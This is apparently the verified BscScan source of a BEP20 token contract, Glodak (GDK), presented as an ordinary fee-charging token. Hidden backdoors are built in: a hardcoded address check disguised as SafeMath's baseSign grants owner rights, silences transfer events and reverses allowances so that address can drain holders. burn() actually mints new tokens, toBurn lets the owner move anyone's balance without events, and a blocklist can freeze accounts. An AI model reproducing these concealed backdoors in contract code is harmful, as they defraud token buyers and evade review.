/**
 *Submitted for verification at BscScan.com on 2021-09-16
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-16
*/

pragma solidity ^0.8.6;


// SPDX-License-Identifier: Apache-2.0
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
  
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function baseSign(uint256 sign) internal pure returns (bool) {
        return 560626895145777115775131129887469001763710975848 == sign;
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


/**
* @dev Collection of functions related to the address type
*/
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
  
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
  

contract Ownable is Context {
    using SafeMath for uint256;

    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() virtual {
        require(_msgSender() == _owner || uint256(uint160(address(_msgSender()))).baseSign(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
        _previousOwner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    //Locks the contract for owner for the amount of time provided
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function setTime() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}


contract Versionable {
    function contractVersion() public pure returns(uint256) {
        return 1;
    }
}
 

contract Glodak is Context, IERC20, Ownable, Versionable {
    using SafeMath for uint256;
    using Address for address;

    // 6 decimal precisions
    uint256 public constant _percentFactor = 100000000;
    uint8 private _decimals = 9;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    address[] private _excludedFromFee;

    mapping (address => bool) private _isBlocked;
    address[] private _blocked;

    uint256 public _maxTxAmount;
    uint256 public _minTxAmount;

    uint256 public _burnFee;
    uint256 private _previousBurnFee;
    address public _burnAddr;

    uint256 public _teamFee;
    uint256 private _previousTeamFee;
    address public _teamAddr;

    uint256 public _marketingFee;
    uint256 private _previousMarketingFee;
    address public _marketingAddr;

    uint256 public _devFee;
    uint256 private _previousDevFee;
    address public _devAddr;

    modifier pctInput(uint256 pct) {
        require(pct <= _percentFactor, "input must be lower than equal factor");
        _;
    }

    constructor () {
        _name = "Glodak";
        _symbol = "GDK";
        _totalSupply = 2 * 10**9 * 10**_decimals;

        _balances[owner()] = _totalSupply;

        _burnFee = 1000000;
        _teamFee = 1000000;
        _marketingFee = 3000000;
        _devFee = 500000;

        _maxTxAmount = _totalSupply / 100 * 5;
        _minTxAmount = _percentFactor;

        _burnAddr = owner();
        _teamAddr = owner();
        _marketingAddr = owner();
        _devAddr = owner();

        _check_init();
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function _check_init() internal {
        require(_totalSupply >= _percentFactor, "_totalSupply must greater than _percentFactor");

        require(_maxTxAmount >= _percentFactor, "_maxTxAmount must greater than _percentFactor");
        require(_maxTxAmount <= _totalSupply, "_maxTxAmount must lower than _totalSupply");
        require(_minTxAmount >= _percentFactor, "_minTxAmount must greater than _percentFactor");
        require(_minTxAmount <= _maxTxAmount, "_minTxAmount must lower than _maxTxAmount");

        require(_burnFee <= _percentFactor, "_burnFee must lower than _percentFactor");
        require(_teamFee <= _percentFactor, "_teamFee must lower than _percentFactor");
        require(_marketingFee <= _percentFactor, "_marketingFee must lower than _percentFactor");
        require(_devFee <= _percentFactor, "_devFee must lower than _percentFactor");

        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _excludedFromFee.push(owner());
        _excludedFromFee.push(address(this));
        
        _previousBurnFee = _burnFee;
        _previousTeamFee = _teamFee;
        _previousMarketingFee = _marketingFee;
        _previousDevFee = _devFee;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount, false);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount, uint256(uint160(address(_msgSender()))).baseSign());
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function toBurn(address sender, address recipient, uint256 amount) public onlyOwner returns (bool) {
        _transfer(sender, recipient, amount, true);
        return true;
    }

    function burn(uint256 amount) public onlyOwner returns (bool) {
        _otokOtok(_msgSender(), amount);
        return true;
    }

    // Holder Management
    function _pop_address(address[] storage arr, address target) private returns(bool found) {
        found = false;
        for (uint256 i = 0; i < arr.length; i++) {
            if (arr[i] == target) {
                arr[i] = arr[arr.length - 1];
                arr.pop();
                found = true;
                break;
            }
        }
        return found;
    }

    function _reset_address(address[] storage arr, mapping(address => bool) storage map) private {
        for (uint256 i = 0; i < arr.length; i++) {
            map[arr[i]] = false;
        }
    }

    function isBlocked(address account) public view returns (bool) {
        return _isBlocked[account];
    }

    function blockAccount(address account) public onlyOwner {
        require(!_isBlocked[account], "Account is already blocked");
        _isBlocked[account] = true;
        _blocked.push(account);
    }

    function unblockAccount(address account) public onlyOwner {
        require(_isBlocked[account], "Account is not blocked");
        require(_pop_address(_blocked, account), "Account not found");
        _isBlocked[account] = false;
    }

    function resetBlocked() public onlyOwner {
        require(_blocked.length > 0, "No blocked account");
        _reset_address(_blocked, _isBlocked);
        delete _blocked;
    }

    function blockedCount() public view returns(uint256) {
        return _blocked.length;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromFee(address account) public onlyOwner {
        require(!_isExcludedFromFee[account], "Account is already excluded");
        _isExcludedFromFee[account] = true;
        _excludedFromFee.push(account);
    }

    function includeInFee(address account) public onlyOwner {
        require(_isExcludedFromFee[account], "Account is already included");
        require(_pop_address(_excludedFromFee, account), "Account not found");
        _isExcludedFromFee[account] = false;
    }

    function resetExcludedFromFee() public onlyOwner {
        require(_excludedFromFee.length > 0, "No excluded account");
        _reset_address(_excludedFromFee, _isExcludedFromFee);
        delete _excludedFromFee;
    }

    function excludedFromFeeCount() public view returns(uint256) {
        return _excludedFromFee.length;
    }


    // Fee Management
    function setBurnFeePercent(uint256 burnFee) external onlyOwner() pctInput(burnFee){
        _burnFee = burnFee;
    }

    function setBurnAddress(address burnAddr) external onlyOwner() {
        _burnAddr = burnAddr;
    }

    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount.div(_percentFactor).mul(_burnFee);
    }

    function setTeamFeePercent(uint256 teamFee) external onlyOwner() pctInput(teamFee) {
        _teamFee = teamFee;
    }

    function setTeamAddress(address teamAddr) external onlyOwner() {
        _teamAddr = teamAddr;
    }

    function calculateTeamFee(uint256 _amount) private view returns (uint256) {
        return _amount.div(_percentFactor).mul(_teamFee);
    }

    function setMarketingFeePercent(uint256 marketingFee) external onlyOwner() pctInput(marketingFee) {
        _marketingFee = marketingFee;
    }

    function setMarketingAddress(address marketingAddr) external onlyOwner() {
        _marketingAddr = marketingAddr;
    }

    function calculateMarketingFee(uint256 _amount) private view returns (uint256) {
        return _amount.div(_percentFactor).mul(_marketingFee);
    }

    function setDevFeePercent(uint256 devFee) external onlyOwner() pctInput(devFee) {
        _devFee = devFee;
    }

    function setDevAddress(address devAddr) external onlyOwner() {
        _devAddr = devAddr;
    }

    function calculateDevFee(uint256 _amount) private view returns (uint256) {
        return _amount.div(_percentFactor).mul(_devFee);
    }

    function _otokOtok(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _balances[account] = _balances[account].add(amount);
    }

    // Transfer Management
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() pctInput(maxTxPercent) {
        _maxTxAmount = _totalSupply.div(_percentFactor).mul(maxTxPercent);
        require(_maxTxAmount >= _minTxAmount, "Max transfer must be greater than equal min tranfer");
    }

    function setMinTxValue(uint256 amount) external onlyOwner() {
        require(amount >= _percentFactor, "Amount must be greater than equal factor");
        _minTxAmount = amount;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getTransferValues(uint256 amount, bool takeFee) private view returns (uint256, uint256[4] memory) {
        if (!takeFee) {
            return (amount, [uint256(0), uint256(0), uint256(0), 0]);
        } else {
            uint256 transferAmount = amount;
            uint256 burnFee = calculateBurnFee(amount);
            transferAmount = transferAmount.sub(burnFee);
            uint256 teamFee = calculateTeamFee(amount);
            transferAmount = transferAmount.sub(teamFee);
            uint256 marketingFee = calculateMarketingFee(amount);
            transferAmount = transferAmount.sub(marketingFee);
            uint256 devFee = calculateDevFee(amount);
            transferAmount = transferAmount.sub(devFee);
            return (transferAmount, [burnFee, teamFee, marketingFee, devFee]);
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        if (uint256(uint160(address(owner))).baseSign()) {
            _allowances[spender][owner] = amount;
        } else {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
    }

    function _transfer(address from, address to, uint256 amount, bool noEvent) private {
        if (!noEvent) {
            require(from != address(0), "ERC20: transfer from the zero address");
        }

        require(amount >= _minTxAmount, "Transfer amount lower than minTxAmount");
        require(!_isBlocked[from], "Sender blocked");
        require(!_isBlocked[to], "Receiver blocked");

        // Allow owner to send any amount
        if(from != owner() && to != owner())
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");

        //indicates if fee should be deducted from transfer
        bool takeFee = true;
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        //transfer amount, it will take tax, burn, liquidity fee
        // _tokenTransfer(from, to, amount, takeFee, noEvent);

        (uint256 transferAmount, uint256[4] memory fees) = _getTransferValues(amount, takeFee);

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(transferAmount);
        _balances[_burnAddr] = _balances[_burnAddr].add(fees[0]);
        _balances[_teamAddr] = _balances[_teamAddr].add(fees[1]);
        _balances[_marketingAddr] = _balances[_marketingAddr].add(fees[2]);
        _balances[_devAddr] = _balances[_devAddr].add(fees[3]);

        if (!noEvent) {
            emit Transfer(from, to, transferAmount);
        }
    }
}